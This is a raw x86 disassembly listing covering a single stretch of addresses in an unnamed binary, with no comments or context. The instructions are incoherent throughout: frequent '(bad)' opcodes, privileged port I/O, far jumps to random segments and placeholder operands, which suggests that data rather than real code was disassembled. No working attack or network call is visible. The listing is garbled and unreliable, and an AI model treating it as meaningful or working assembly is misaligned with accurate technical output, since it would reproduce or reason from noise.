  40d2a8:	pmulhw mm1,QWORD PTR [eax+0x6199bb25]
  40d2af:	xor    edi,DWORD PTR [edx+0x12]
  40d2b2:	mov    ?,WORD PTR [ebp+0x1d]
  40d2b5:	jge    0x40d32c
  40d2b7:	(bad)  
  40d2b8:	in     eax,dx
  40d2b9:	mov    edi,0x8170b394
  40d2be:	push   ds
  40d2bf:	adc    ah,BYTE PTR [ebp+0x52]
  40d2c2:	pop    ebp
  40d2c3:	mov    dl,0xc3
  40d2c5:	loopne 0x40d2e9
  40d2c7:	outs   dx,BYTE PTR ds:[esi]
  40d2c8:	(bad)  
  40d2c9:	dec    edx
  40d2ca:	mov    eax,ds:0xeb5c3d0c
  40d2cf:	jmp    0x4f9e:0xd2b4b26b
  40d2d6:	sbb    edx,DWORD PTR [eax-0x578d8b28]
  40d2dc:	sbb    edx,ebx
  40d2de:	cli    
  40d2df:	jne    0x40d26c
  40d2e1:	cld    
  40d2e2:	adc    al,0xe0
  40d2e4:	push   es
  40d2e5:	cld    
  40d2e6:	(bad)  [edx]
  40d2e8:	(bad)  
  40d2e9:	mov    ds:0x98b66e23,eax
  40d2ee:	ficomp DWORD PTR [ebx*8+0x428c8cdb]
  40d2f5:	cmp    eax,0x5939daed
  40d2fa:	mov    edx,0x3609b9e6
  40d2ff:	cmp    esp,DWORD PTR [edi]
  40d301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d302:	xor    eax,0xd5cc3776
  40d307:	(bad)  
  40d308:	lock pop ds
  40d30a:	push   ecx
  40d30b:	mov    ebx,0xb6c2e54
  40d310:	push   ss
  40d311:	cld    
  40d312:	out    0x6,eax
  40d314:	adc    BYTE PTR [eax],bh
  40d316:	loope  0x40d2d7
  40d318:	mov    eax,ds:0x2bfda6c8
  40d31d:	cmp    al,0xd1
  40d31f:	xchg   edx,eax
  40d320:	adc    eax,0xd5818eda
  40d325:	pop    ss
  40d326:	jbe    0xbd415bd2
  40d32c:	add    eax,0xe1cb0eb6
  40d331:	add    dh,al
  40d333:	data16 jl 0x40d2c4
  40d336:	push   ecx
  40d337:	dec    edi
  40d338:	fstp   DWORD PTR [ebx]
  40d33a:	test   DWORD PTR [ebx],esi
  40d33c:	lock dec esi
  40d33e:	mov    esi,0x7d51825d
  40d343:	data16 (bad) 
  40d345:	cs rol esp,cl
  40d348:	fwait
  40d349:	loope  0x40d334
  40d34b:	add    eax,0x49fe9965
  40d350:	in     al,0xaf
  40d352:	les    ebp,FWORD PTR [esi+ebp*2-0xc]
  40d356:	inc    ebp
  40d357:	mov    edx,0x5585039d
  40d35c:	aas    
  40d35d:	test   cl,ch
  40d35f:	xchg   ebx,eax
  40d360:	add    dh,BYTE PTR [ebp+0x59fecc2a]
  40d366:	ret    
  40d367:	fld    DWORD PTR [ebx+0x66050f87]
  40d36d:	and    al,0x2d
  40d36f:	jecxz  0x40d3da
  40d371:	mov    al,ds:0xd3acaf38
  40d376:	adc    DWORD PTR [esi+0x11ac4c1e],0x9f2a90f
  40d380:	jl     0x40d3bf
  40d382:	out    0x81,eax
  40d384:	sahf   
  40d385:	fwait
  40d386:	push   edi
  40d387:	in     al,0xbb
  40d389:	outs   dx,BYTE PTR ds:[esi]
  40d38a:	adc    bl,ch
  40d38c:	add    al,0x2
  40d38e:	add    ah,dl
  40d390:	out    0x59,eax
  40d392:	sbb    eax,0x29e40269
  40d397:	push   0x27
  40d399:	and    DWORD PTR ds:0xe9bfb958,edi
  40d39f:	in     al,0xaf
  40d3a1:	cmc    
  40d3a2:	xchg   edi,eax
  40d3a3:	fidiv  DWORD PTR [eax-0xc]
  40d3a6:	push   cs
  40d3a7:	mov    ebp,0xe692ff75
  40d3ac:	or     BYTE PTR [ecx],0x88
  40d3af:	(bad)  
  40d3b1:	ret    0x8770
  40d3b4:	push   esi
  40d3b5:	lock xchg ecx,eax
  40d3b7:	xchg   DWORD PTR [ebx+0x5],ecx
  40d3ba:	pop    ds
  40d3bb:	hlt    
  40d3bc:	pop    esi
  40d3bd:	ins    DWORD PTR es:[edi],dx
  40d3be:	dec    ecx
  40d3bf:	cmp    bh,BYTE PTR [esi+0x43]
  40d3c2:	call   0xdf88501d
  40d3c7:	add    eax,0xd115c306
  40d3cc:	add    BYTE PTR [edx-0x5e],cl
  40d3cf:	jmp    0x40d3ca
  40d3d1:	xchg   BYTE PTR [ebx+0x777e4d6a],bl
  40d3d7:	xchg   edx,eax
  40d3d8:	and    esi,DWORD PTR [eax+0x40dc31f2]
  40d3de:	aam    0x7c
  40d3e0:	js     0x40d374
  40d3e2:	cmp    ah,BYTE PTR [ebx]
  40d3e4:	push   es
  40d3e5:	cmp    eax,0xe43c33e7
  40d3ea:	xor    eax,0x32a2f340
  40d3ef:	inc    ecx
  40d3f0:	jg     0x40d3bf
  40d3f2:	imul   eax,DWORD PTR [ebx-0x5],0x33
  40d3f6:	mov    esp,0xa7c8fb2
  40d3fb:	nop
  40d3fc:	or     al,0xa0
  40d3fe:	mov    WORD PTR [ebx-0x66194b14],gs
  40d404:	int3   
  40d405:	or     DWORD PTR [edx-0x4c9f1444],esi
  40d40b:	push   ebp
  40d40c:	aaa    
  40d40d:	loop   0x40d3b2
  40d40f:	sbb    esp,DWORD PTR [esi-0x2]
  40d412:	jmp    0x40d437
  40d414:	retf   
  40d415:	lea    ecx,fs:[eax+0xb]
  40d419:	(bad)  
  40d41a:	stos   DWORD PTR es:[edi],eax
  40d41b:	nop
  40d41c:	inc    ebp
  40d41d:	xchg   ebp,eax
  40d41e:	test   eax,0x84428135
  40d423:	int    0xbf
  40d425:	sar    ebx,0x1d
  40d428:	or     DWORD PTR [ecx-0x37],ecx
  40d42b:	cwde   
  40d42c:	ds in  al,dx
  40d42e:	mov    bl,0xf3
  40d430:	jge    0x40d471
  40d432:	rcl    ecx,0x5a
  40d435:	loopne 0x40d44b
  40d437:	mov    eax,ds:0x8a1946bc
  40d43c:	add    DWORD PTR [eax+0x6c],ebx
  40d43f:	push   ss
  40d440:	inc    esp
  40d441:	(bad)  
  40d442:	push   0xffffffc1
  40d444:	dec    esi
  40d445:	adc    bh,BYTE PTR [esi+edi*4-0x149d7f51]
  40d44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d44d:	pop    ebp
  40d44e:	mov    ds:0xe7d85688,al
  40d453:	repnz adc DWORD PTR [edi+eiz*1+0x6541370d],ebp
  40d45b:	(bad)  
  40d45c:	add    al,0xec
  40d45e:	xor    eax,0x6de9ebfe
  40d463:	(bad)  
  40d464:	icebp  
  40d465:	mov    dl,0xbb
  40d467:	mov    al,ds:0xb2365058
  40d46c:	jecxz  0x40d448
  40d46e:	icebp  
  40d46f:	clc    
  40d470:	mov    WORD PTR [edi],?
  40d472:	es push ecx
  40d474:	js     0x40d497
  40d476:	(bad)  
  40d477:	lock jge 0x40d4f3
  40d47a:	add    eax,0x49cf3ddf
  40d47f:	sbb    ch,0x87
  40d482:	lock mov esp,0x628e8bce
  40d488:	jno    0x40d464
  40d48a:	sub    al,0x94
  40d48c:	sahf   
  40d48d:	or     bh,BYTE PTR [esi+0x7d]
  40d490:	inc    edi
  40d491:	jp     0x40d49a
  40d493:	retf   0x1aa2
  40d496:	sbb    esp,DWORD PTR [ecx]
  40d498:	sar    BYTE PTR [esi],cl
  40d49a:	xchg   esp,eax
  40d49b:	sub    dl,BYTE PTR [edi-0x76]
  40d49e:	mov    esp,0x60812f19
  40d4a3:	xlat   BYTE PTR ds:[ebx]
  40d4a4:	fabs   
  40d4a6:	cli    
  40d4a7:	push   ebp
  40d4a8:	ficomp WORD PTR [ebx+eiz*4+0x11]
  40d4ac:	stos   BYTE PTR es:[edi],al
  40d4ad:	(bad)  
  40d4ae:	cmp    BYTE PTR [ebx-0x21],bl
  40d4b1:	nop
  40d4b2:	adc    eax,0xff27e22d
  40d4b7:	in     al,dx
  40d4b8:	aad    0xf
  40d4ba:	lahf   
  40d4bb:	cld    
  40d4bc:	mov    esp,0xb62ebe3b
  40d4c1:	stos   BYTE PTR es:[edi],al
  40d4c2:	enter  0x49d0,0x5f
  40d4c6:	mov    dl,0xab
  40d4c8:	int3   
  40d4c9:	inc    edi
  40d4ca:	pop    esp
  40d4cb:	inc    esi
  40d4cc:	or     bl,dl
  40d4ce:	and    ah,ch
  40d4d0:	or     esp,esi
  40d4d2:	push   eax
  40d4d3:	mov    esi,0x9b6249af
  40d4d8:	scas   eax,DWORD PTR es:[edi]
  40d4d9:	jno    0x40d4ab
  40d4db:	add    eax,0xe1500144
  40d4e0:	rol    bh,cl
  40d4e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4e3:	call   0xc756:0x1410e0d6
  40d4ea:	xor    eax,0xffc2c6ba
  40d4ef:	dec    eax
  40d4f0:	push   0x6
  40d4f2:	cmc    
  40d4f3:	es inc eax
  40d4f5:	pop    edx
  40d4f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4f7:	jge    0x40d49a
  40d4f9:	sbb    bl,BYTE PTR ds:0xab7218cd
  40d4ff:	div    dl
  40d501:	mov    cl,bl
  40d503:	push   esi
  40d504:	cld    
  40d505:	cli    
  40d506:	es xor al,ch
  40d509:	push   esi
  40d50a:	gs ins DWORD PTR es:[edi],dx
  40d50c:	ins    DWORD PTR es:[edi],dx
  40d50d:	mov    DWORD PTR [edx],0xdf2324c3
  40d513:	add    esp,DWORD PTR [edi+edx*4+0x43]
  40d517:	pop    ebx
  40d518:	mov    ds:0xd63cdcb2,eax
  40d51d:	inc    ebp
  40d51e:	and    eax,0xd3c73a31
  40d523:	fsubr  st(4),st
  40d525:	or     BYTE PTR [esi+0x30],ah
  40d528:	(bad)  
  40d529:	test   al,0xbf
  40d52b:	xor    BYTE PTR [edx],dl
  40d52d:	or     dl,bl
  40d52f:	aas    
  40d530:	arpl   WORD PTR [edi-0x46],sp
  40d533:	mov    ch,0xd8
  40d535:	fisttp WORD PTR [edi+0x5c]
  40d538:	sar    DWORD PTR [esi-0x2ed44d34],cl
  40d53e:	xor    DWORD PTR [edi+0x418045f4],ebx
  40d544:	stc    
  40d545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d546:	and    esi,DWORD PTR [ebp+0x287745e7]
  40d54c:	scas   ax,WORD PTR es:[edi]
  40d54e:	test   al,0x69
  40d550:	push   0xe3ebc5a7
  40d555:	rcr    edi,1
  40d557:	loopne 0x40d507
  40d559:	or     edi,DWORD PTR [ecx]
  40d55b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d55c:	repz pop ds
  40d55e:	jo     0x40d51a
  40d560:	xlat   BYTE PTR ds:[ebx]
  40d561:	lods   al,BYTE PTR ds:[esi]
  40d562:	iret   
  40d563:	loope  0x40d52b
  40d565:	xor    al,0xcd
  40d567:	jo     0x40d5af
  40d569:	sbb    eax,0xd035f730
  40d56e:	mov    dh,dl
  40d570:	loope  0x40d5ed
  40d572:	or     DWORD PTR [esi],esp
  40d574:	iret   
  40d575:	inc    edx
  40d576:	jb     0x40d59d
  40d578:	xor    ecx,DWORD PTR [edx-0xf]
  40d57b:	lock cmp ch,BYTE PTR [ecx-0xe87d0dd]
  40d582:	in     eax,0xa
  40d584:	push   0x3396ff4
  40d589:	cmp    al,0x1e
  40d58b:	jl     0x40d53d
  40d58d:	daa    
  40d58e:	int3   
  40d58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d590:	mov    ebx,0x8ac58e85
  40d595:	add    BYTE PTR [edi-0x2b8919f4],bh
  40d59b:	rcl    eax,1
  40d59d:	loopne 0x40d5fa
  40d59f:	fiadd  WORD PTR [ecx-0x7736cc68]
  40d5a5:	(bad)  
  40d5a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5a7:	or     BYTE PTR [edx+ecx*8],bl
  40d5aa:	lods   al,BYTE PTR ds:[esi]
  40d5ab:	sbb    DWORD PTR [eax],edi
  40d5ad:	mov    eax,ds:0xb38f5a07
  40d5b2:	test   DWORD PTR ds:0x6ef2349f,ebx
  40d5b8:	mov    esi,0x70ca1c3a
  40d5bd:	or     eax,0xbbdbf62d
  40d5c2:	add    al,0xaa
  40d5c4:	out    0x11,eax
  40d5c6:	push   ds
  40d5c7:	mov    al,0x67
  40d5c9:	aam    0xfc
  40d5cb:	push   edx
  40d5cc:	jb     0x40d5d7
  40d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5cf:	(bad)  
  40d5d1:	jp     0x40d641
  40d5d3:	jne    0x40d5ec
  40d5d5:	js     0x40d5b5
  40d5d7:	in     al,0xe3
  40d5d9:	mov    eax,esp
  40d5db:	dec    ecx
  40d5dc:	mov    ah,0x79
  40d5de:	jbe    0x40d5b4
  40d5e0:	adc    ch,bl
  40d5e2:	adc    bl,cl
  40d5e4:	out    0x4e,eax
  40d5e6:	fnstcw WORD PTR [ebp+0xe]
  40d5e9:	ins    BYTE PTR es:[edi],dx
  40d5ea:	mov    BYTE PTR [edx-0x7a],0xe4
  40d5ee:	sub    al,0x3d
  40d5f0:	mov    al,0x45
  40d5f2:	nop
  40d5f3:	cwde   
  40d5f4:	mov    BYTE PTR [ecx-0x2f],ch
  40d5f7:	idiv   BYTE PTR [ecx+0x1d]
  40d5fa:	retf   0xc0db
  40d5fd:	data16 gs adc al,0x9c
  40d601:	mov    DWORD PTR [ebp-0x62d449aa],eax
  40d607:	les    ebx,FWORD PTR [ecx-0x1da8969f]
  40d60d:	jnp    0x40d5a0
  40d60f:	popa   
  40d610:	lea    esp,[edx]
  40d612:	inc    edi
  40d613:	in     eax,dx
  40d614:	push   cs
  40d615:	adc    DWORD PTR [edi+0x39],ecx
  40d618:	(bad)  
  40d619:	mov    dl,0x22
  40d61b:	dec    ecx
  40d61c:	fdivr  QWORD PTR [eax-0x210de948]
  40d622:	or     ebx,eax
  40d624:	stos   DWORD PTR es:[edi],eax
  40d625:	jns    0x40d5eb
  40d627:	push   es
  40d628:	cmc    
  40d629:	icebp  
  40d62a:	out    dx,eax
  40d62b:	je     0x40d60a
  40d62d:	sbb    al,0x4f
  40d62f:	and    eax,0x525e2b6a
  40d634:	and    eax,0xe94e5f32
  40d639:	mov    ah,0x3a
  40d63b:	lods   al,BYTE PTR ds:[esi]
  40d63c:	loopne 0x40d64a
  40d63e:	inc    ecx
  40d63f:	icebp  
  40d640:	out    0x23,eax
  40d642:	or     cl,bh
  40d644:	pop    ss
  40d645:	test   BYTE PTR [edi-0xf],bl
  40d648:	(bad)  
  40d649:	icebp  
  40d64a:	fdivr  QWORD PTR ds:0x9433882e
  40d650:	mov    dl,0xe7
  40d652:	jo     0x40d5f5
  40d654:	add    dh,BYTE PTR [ebx-0x7]
  40d657:	dec    ebx
  40d658:	ja     0x40d6a5
  40d65a:	push   edx
  40d65b:	xchg   esi,eax
  40d65c:	rcr    DWORD PTR [eax+0xc],0xd8
  40d660:	das    
  40d661:	int3   
  40d662:	sbb    al,0xf3
  40d664:	pop    ds
  40d665:	sub    DWORD PTR [ebx],0x92ed860a
  40d66b:	mov    edi,0xa59110bc
  40d670:	jge    0x40d655
  40d672:	ret    0xd910
  40d675:	mov    esi,0xf00281d0
  40d67a:	enter  0x5d31,0xa8
  40d67e:	test   DWORD PTR [esp+ebx*8],esp
  40d681:	xlat   BYTE PTR ds:[ebx]
  40d682:	je     0x40d6c1
  40d684:	call   0xce13:0x10ecfaa3
  40d68b:	pop    esp
  40d68c:	bound  edi,QWORD PTR ds:0xed0580f1
  40d692:	jns    0x40d709
  40d694:	stc    
  40d695:	scas   al,BYTE PTR es:[edi]
  40d696:	cwde   
  40d697:	sar    DWORD PTR [edx+0x1e],cl
  40d69a:	cli    
  40d69b:	mov    eax,ds:0xc15c54ab
  40d6a0:	xchg   edx,eax
  40d6a1:	cmp    eax,0x1757ef04
  40d6a6:	aas    
  40d6a7:	mov    ebx,0x84821b5d
  40d6ac:	add    esp,DWORD PTR [ecx+0x26]
  40d6af:	or     BYTE PTR [ebx-0x7fff274e],cl
  40d6b5:	push   ecx
  40d6b6:	xchg   esp,eax
  40d6b7:	(bad)  
  40d6b8:	in     al,0xfb
  40d6ba:	arpl   WORD PTR [edi-0x2ae3570a],bx
  40d6c0:	out    0x6e,al
  40d6c2:	jmp    FWORD PTR [ebp+0x2d]
  40d6c5:	dec    eax
  40d6c6:	je     0x40d6de
  40d6c8:	and    DWORD PTR [ebx+0x71],ebp
  40d6cb:	fimul  DWORD PTR [edx+edx*2+0x11b6295a]
  40d6d2:	rcl    dh,cl
  40d6d4:	stos   BYTE PTR es:[edi],al
  40d6d5:	outs   dx,DWORD PTR ds:[esi]
  40d6d6:	pop    edi
  40d6d7:	aas    
  40d6d8:	pusha  
  40d6d9:	jecxz  0x40d74f
  40d6db:	out    dx,al
  40d6dc:	repnz enter 0x8ffe,0x76
  40d6e1:	add    ah,BYTE PTR [edi+esi*1+0x65]
  40d6e5:	xchg   edx,eax
  40d6e6:	pop    ebx
  40d6e7:	adc    BYTE PTR [ebx],al
  40d6e9:	loopne 0x40d6b8
  40d6eb:	mov    dh,dl
  40d6ed:	cwde   
  40d6ee:	or     ebx,DWORD PTR [ebx-0x6cb839f1]
  40d6f4:	inc    edi
  40d6f5:	stos   DWORD PTR es:[edi],eax
  40d6f6:	or     BYTE PTR [eax-0x6],al
  40d6f9:	add    al,0x30
  40d6fb:	retf   0x4e1d
  40d6fe:	mov    dl,0xfe
  40d700:	and    BYTE PTR [edi],0xf3
  40d703:	jg     0x40d756
  40d705:	cli    
  40d706:	mov    eax,ds:0xb49a7d4
  40d70b:	cmp    edx,DWORD PTR [edx+0x37967c6]
  40d711:	mov    ebx,0xa83d17c7
  40d716:	sahf   
  40d717:	mov    bh,BYTE PTR [edi+0x65]
  40d71a:	pop    es
  40d71b:	shr    DWORD PTR [bp+si-0x78],0x36
  40d720:	and    eax,0xe9761931
  40d725:	mov    ah,0x4e
  40d727:	jo     0x40d742
  40d729:	or     esp,eax
  40d72b:	push   ebx
  40d72c:	or     DWORD PTR [ecx-0x67],esp
  40d72f:	pop    ecx
  40d730:	stos   BYTE PTR es:[edi],al
  40d731:	retf   
  40d732:	mov    bl,0x41
  40d734:	in     eax,dx
  40d735:	mov    cl,0x8b
  40d737:	cmp    DWORD PTR [eax],ecx
  40d739:	dec    esi
  40d73a:	out    0x6,eax
  40d73c:	push   ecx
  40d73d:	arpl   ax,cx
  40d73f:	hlt    
  40d740:	ds in  al,dx
  40d742:	cmp    eax,0x199f9383
  40d747:	mov    bh,BYTE PTR [ebx]
  40d749:	jle    0x40d7c3
  40d74b:	fnsave [edi+0x4f]
  40d74e:	(bad)  
  40d74f:	adc    bl,0x9a
  40d752:	repz mov cl,0x97
  40d755:	jnp    0x40d797
  40d757:	inc    ecx
  40d758:	sahf   
  40d759:	mov    BYTE PTR fs:[ebp-0x35a6d975],bh
  40d760:	adc    al,0x5c
  40d762:	adc    edx,ebx
  40d764:	push   edx
  40d765:	fisubr WORD PTR ds:0xe28e5e45
  40d76b:	jmp    0x40d722
  40d76d:	ret    
  40d76e:	adc    BYTE PTR [eax+0x1585a6e9],cl
  40d774:	sub    eax,0xc273249a
  40d779:	(bad)  [eax+0x24]
  40d77c:	mov    ah,0x74
  40d77e:	pop    ds
  40d77f:	outs   dx,BYTE PTR ds:[esi]
  40d780:	inc    DWORD PTR [edi+0x331b3e67]
  40d786:	push   0x6ec028bc
  40d78b:	fsub   st(4),st
  40d78d:	inc    eax
  40d78e:	or     BYTE PTR [esi],0x66
  40d791:	mov    edi,0x10fa4167
  40d796:	add    BYTE PTR [ebx+0x37],dh
  40d799:	mov    al,ds:0x86771126
  40d79e:	mov    cl,0x24
  40d7a0:	jmp    0x40d725
  40d7a2:	inc    ebp
  40d7a3:	xchg   esp,eax
  40d7a4:	dec    ebx
  40d7a5:	out    0x19,al
  40d7a7:	jge    0x40d73d
  40d7a9:	push   ds
  40d7aa:	dec    ebp
  40d7ab:	adc    BYTE PTR [ebx+0x7b],dl
  40d7ae:	ins    DWORD PTR es:[edi],dx
  40d7af:	push   cs
  40d7b0:	ins    BYTE PTR es:[edi],dx
  40d7b1:	in     eax,dx
  40d7b2:	in     al,dx
  40d7b3:	lods   eax,DWORD PTR ds:[esi]
  40d7b4:	(bad)
  40d7b8:	stos   BYTE PTR es:[edi],al
  40d7b9:	xchg   ecx,eax
  40d7ba:	cmc    
  40d7bb:	xchg   edx,eax
  40d7bc:	das    
  40d7bd:	jp     0x40d7e7
  40d7bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7c0:	dec    DWORD PTR [edi*4-0x3adbcf5f]
  40d7c7:	xchg   BYTE PTR [ebx+0x8819413],ch
  40d7cd:	call   0x1668:0xc507bc81
  40d7d4:	xchg   esp,eax
  40d7d5:	adc    al,0x35
  40d7d7:	das    
  40d7d8:	ss std 
  40d7da:	out    0x54,eax
  40d7dc:	loope  0x40d82c
  40d7de:	pop    ss
  40d7df:	sub    dl,cl
  40d7e1:	ja     0x40d7d3
  40d7e3:	lahf   
  40d7e4:	ret    0x7cbf
  40d7e7:	inc    ecx
  40d7e8:	(bad)  
  40d7e9:	and    dl,BYTE PTR [esi+0x7616af64]
  40d7ef:	xlat   BYTE PTR ds:[ebx]
  40d7f0:	adc    BYTE PTR [edx-0x31660266],ah
  40d7f6:	mov    ebp,0x26672cb4
  40d7fb:	repnz mov edi,ebp
  40d7fe:	jnp    0x40d836
  40d800:	lods   al,BYTE PTR ds:[esi]
  40d801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d802:	sub    eax,0xeecbbdd1
  40d807:	mov    edx,0x27df3832
  40d80c:	retf   0x19fc
  40d80f:	add    eax,0x29dc53f
  40d814:	dec    ecx
  40d815:	mul    BYTE PTR [ecx+0x28]
  40d818:	add    al,0x35
  40d81a:	mov    ebx,0xe4b2052d
  40d81f:	loop   0x40d7f4
  40d821:	(bad)  
  40d822:	xchg   ecx,eax
  40d823:	xor    al,BYTE PTR [esi]
  40d825:	(bad)  
  40d826:	xchg   esp,eax
  40d827:	push   edx
  40d828:	arpl   bx,sp
  40d82a:	pusha  
  40d82b:	iret   
  40d82c:	leave  
  40d82d:	fdivr  st(0),st
  40d82f:	pop    esi
  40d830:	sub    bl,BYTE PTR [edi]
  40d832:	mov    esp,0xc58474bd
  40d837:	out    dx,eax
  40d838:	addr16 retf 0xd294
  40d83c:	out    dx,eax
  40d83d:	mov    ch,0xca
  40d83f:	fld    TBYTE PTR [ebp-0x55]
  40d842:	push   cs
  40d843:	lahf   
  40d844:	jb     0x40d7f6
  40d846:	mov    ds:0xda075ebd,eax
  40d84b:	jge    0x40d8a0
  40d84d:	xchg   esp,eax
  40d84e:	loopne 0x40d880
  40d850:	push   0xffffffe2
  40d852:	and    dh,BYTE PTR [esi+0xb]
  40d855:	(bad)  
  40d856:	aad    0x2c
  40d858:	jo     0x40d89a
  40d85a:	in     al,dx
  40d85b:	sbb    eax,0x520aed07
  40d860:	outs   dx,BYTE PTR ds:[esi]
  40d861:	mov    ebp,0x6d3cccd3
  40d866:	cmp    cl,dh
  40d868:	add    ah,BYTE PTR [eax]
  40d86a:	xchg   BYTE PTR [eax-0x5f0bb0f0],bh
  40d870:	mov    ebp,0xe9250107
  40d875:	mov    ebp,0xbcdbabf8
  40d87a:	mov    ah,0xb
  40d87c:	jne    0x40d845
  40d87e:	push   ds
  40d87f:	leave  
  40d880:	cli    
  40d881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d882:	sub    eax,0x5263fb48
  40d887:	or     ebx,DWORD PTR [eax-0x79]
  40d88a:	xor    eax,0xedcebf88
  40d88f:	cmp    DWORD PTR [ebp-0xb],ebx
  40d892:	dec    eax
  40d893:	out    dx,al
  40d894:	shl    DWORD PTR [edi+esi*1],cl
  40d897:	in     eax,dx
  40d898:	sub    dl,BYTE PTR [esi]
  40d89a:	and    eax,ecx
  40d89c:	popf   
  40d89d:	mov    ds:0xbabdd20f,eax
  40d8a2:	ins    BYTE PTR es:[edi],dx
  40d8a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8a4:	or     al,bh
  40d8a6:	repz xlat BYTE PTR ds:[ebx]
  40d8a8:	or     eax,0x2e03efe
  40d8ad:	adc    BYTE PTR ds:0x8a426d13,0x6d
  40d8b4:	outs   dx,BYTE PTR ds:[esi]
  40d8b5:	inc    edi
  40d8b6:	sti    
  40d8b7:	sbb    eax,DWORD PTR [edi]
  40d8b9:	cmp    al,0x64
  40d8bb:	cmp    eax,0x91e27849
  40d8c0:	inc    esi
  40d8c1:	das    
  40d8c2:	sub    eax,DWORD PTR [edx+0x4ed529f8]
  40d8c8:	enter  0xeb49,0x76
  40d8cc:	adc    al,0x21
  40d8ce:	stc    
  40d8cf:	ja     0x40d904
  40d8d1:	sub    dh,BYTE PTR [ecx]
  40d8d3:	jb     0x40d8b2
  40d8d5:	imul   edx,ecx,0x48a945b5
  40d8db:	and    eax,0x8c8132af
  40d8e0:	xlat   BYTE PTR ds:[ebx]
  40d8e1:	imul   eax,DWORD PTR [edx+0x1e],0x3c9c0cc1
  40d8e8:	inc    ebp
  40d8e9:	ds or  eax,0x659b42d3
  40d8ef:	mov    dl,BYTE PTR [edi+0x5057b070]
  40d8f5:	and    DWORD PTR [edi+edi*8-0x356cc80b],esp
  40d8fc:	shr    DWORD PTR [ebx-0x9ce0b67],cl
  40d902:	and    esp,DWORD PTR [ebx]
  40d904:	iret   
  40d905:	sar    BYTE PTR [ebx+esi*4+0x6b],0xcf
  40d90a:	sbb    eax,0x3405275c
  40d90f:	sub    bl,bh
  40d911:	test   eax,0x6aeea684
  40d916:	es dec ebp
  40d918:	pop    es
  40d919:	rcr    BYTE PTR [esi],cl
  40d91b:	out    0x9d,al
  40d91d:	jmp    0x40d91e
  40d91f:	daa    
  40d920:	jg     0x40d939
  40d922:	adc    esp,DWORD PTR [esp+edi*2-0x7ee33cca]
  40d929:	lods   al,BYTE PTR ds:[esi]
  40d92a:	push   0xffffffe0
  40d92c:	add    ecx,0xffffff8d
  40d92f:	ror    ah,1
  40d931:	mov    ah,0x81
  40d933:	cmp    esi,DWORD PTR [edx-0x18a19a2b]
  40d939:	loope  0x40d962
  40d93b:	mov    eax,ds:0xcb47d5d2
  40d940:	imul   ebx,DWORD PTR [esi+0xf],0xffffffe5
  40d944:	aaa    
  40d945:	adc    eax,0x1c1dbb6a
  40d94a:	and    DWORD PTR [edi+edi*1-0x2],ecx
  40d94e:	std    
  40d94f:	pusha  
  40d950:	mov    ds:0x1a109e40,al
  40d955:	int3   
  40d956:	loope  0x40d8fa
  40d958:	test   eax,0x93d305f2
  40d95d:	(bad)  
  40d95e:	call   0x6946:0xcce11b5d
  40d965:	sar    DWORD PTR [ebx],1
  40d967:	sbb    DWORD PTR [ebx],esp
  40d969:	jle    0x40d9c8
  40d96b:	sub    eax,0xef0c59eb
  40d970:	xlat   BYTE PTR ds:[ebx]
  40d971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d972:	pop    ss
  40d973:	adc    eax,0xdebc5d8d
  40d978:	nop
  40d979:	xor    ch,al
  40d97b:	inc    edi
  40d97c:	mov    WORD PTR [edi],fs
  40d97e:	std    
  40d97f:	aas    
  40d980:	add    DWORD PTR [esi],edi
  40d982:	shl    BYTE PTR [eax-0x4a16a8c0],0x5f
  40d989:	inc    esp
  40d98a:	mov    ebx,?
  40d98c:	or     DWORD PTR [ecx+ebx*4],ebp
  40d98f:	out    0x91,al
  40d991:	dec    edi
  40d992:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d993:	outs   dx,DWORD PTR ds:[esi]
  40d994:	es out 0xe7,eax
  40d997:	scas   al,BYTE PTR es:[edi]
  40d998:	outs   dx,BYTE PTR ds:[esi]
  40d999:	pop    ss
  40d99a:	lods   al,BYTE PTR ds:[esi]
  40d99b:	scas   al,BYTE PTR es:[edi]
  40d99c:	shl    ebx,0x4c
  40d99f:	popa   
  40d9a0:	popf   
  40d9a1:	cli    
  40d9a2:	mov    ebx,0xc3276384
  40d9a7:	lds    edx,FWORD PTR [esi-0x3c]
  40d9aa:	out    dx,al
  40d9ab:	jle    0x40d9a6
  40d9ad:	shl    bl,1
  40d9af:	xor    al,0xdf
  40d9b1:	(bad)  
  40d9b2:	loopne 0x40d9e7
  40d9b4:	jmp    0x2ede23a
  40d9b9:	fld    DWORD PTR [edx+edx*4-0x57fdc99]
  40d9c0:	mov    al,0xef
  40d9c2:	push   ds
  40d9c3:	aaa    
  40d9c4:	repnz mov esp,0x72f1a362
  40d9ca:	mov    edi,0xe063397b
  40d9cf:	je     0x40d9be
  40d9d1:	(bad)  
  40d9d2:	stc    
  40d9d3:	jb     0x40d9d5
  40d9d5:	mov    ds:0xfb490875,al
  40d9da:	shl    DWORD PTR [ebp-0x78],0xcb
  40d9de:	cdq    
  40d9df:	das    
  40d9e0:	cmp    BYTE PTR [ecx],dh
  40d9e2:	or     DWORD PTR [ebp-0x319d60bd],ebx
  40d9e8:	ins    BYTE PTR es:[edi],dx
  40d9e9:	mov    eax,ds:0xa4e9ea04
  40d9ee:	push   es
  40d9ef:	and    eax,DWORD PTR [edi+eiz*2]
  40d9f2:	push   esp
  40d9f3:	cmp    eax,0xa29d2b44
  40d9f8:	fcom   QWORD PTR [esi+0x2220ee0e]
  40d9fe:	call   0x57594b4a
  40da03:	loopne 0x40d99b
  40da05:	test   DWORD PTR cs:[esi],esi
  40da08:	scas   eax,DWORD PTR es:[edi]
  40da09:	mov    bh,0xfe
  40da0b:	fnstsw WORD PTR [eax-0x71f5284e]
  40da11:	mov    BYTE PTR [ebx],ah
